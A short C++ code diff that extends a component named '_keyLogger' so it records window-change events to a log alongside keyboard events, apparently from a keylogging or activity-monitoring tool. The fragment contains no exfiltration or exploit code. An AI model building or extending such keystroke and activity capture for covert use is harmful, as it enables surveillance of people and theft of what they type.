@@ -121,6 +121,9 @@ namespace spi
             _keyLogger->onKeyboardEvent([this](proto::KeyEvent &&event) {
                 _logHandle.appendEntry(event);
             });
+            _keyLogger->onWindowChangeEvent([this](proto::WindowChanged &&event) {
+                _logHandle.appendEntry(event);
+            });
             return true;
         }
 
